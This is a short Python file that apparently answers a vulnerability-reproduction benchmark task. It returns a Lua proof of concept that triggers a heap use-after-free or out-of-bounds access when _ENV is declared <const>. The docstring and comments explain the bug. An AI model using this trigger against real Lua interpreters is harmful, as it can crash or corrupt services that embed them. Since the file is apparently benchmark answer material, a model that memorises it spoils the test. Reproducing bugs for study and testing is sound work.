import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua.
        The vulnerability occurs when _ENV is declared as <const>, causing incorrect code generation
        where the upvalue is not properly tracked/closed, leading to OOB access/UAF.
        """
        # The PoC defines a function with a local const _ENV (a table).
        # It creates a closure that modifies this _ENV.
        # In vulnerable versions, the closure is created with missing upvalues.
        # Accessing the upvalue (via _ENV.x) triggers a heap out-of-bounds read/write.
        # collectgarbage() is called to ensure heap consistency/trigger potential UAF conditions.
        
        poc = b"""
collectgarbage()
local function f()
  local _ENV <const> = {x=1}
  return function() x=2 end
end
f()()
"""
        return poc
